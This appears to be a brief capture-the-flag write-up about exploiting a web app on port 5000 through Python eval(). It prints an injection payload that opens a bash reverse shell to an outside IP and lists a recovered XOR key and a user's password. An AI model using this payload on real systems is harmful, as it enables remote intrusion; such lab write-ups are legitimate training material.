## Nmap

Only 2 ports are open SSH and port 5000.

## Port 5000

Found a web page on port 5000:

![[Pasted image 20231122110142.png]]

By looking at the source code found an eval() function, which led me to the following site:
https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1

Typed the following command in xa to get a shell:
`__import__('os').system("bash -c 'bash -i >& /dev/tcp/10.13.31.71/6666 0>&1'")#`

Vs able to run the python encryption script using:
`sudo -u gordon /usr/bin/python3 /opt/encrypt.py`

Found the key using cyberchef to decode the base64 message I got from a password and using the password as a key: supersecretkeyxorxorsupersecret

And with the key found the password for gordon: G0th@mR0ckz!
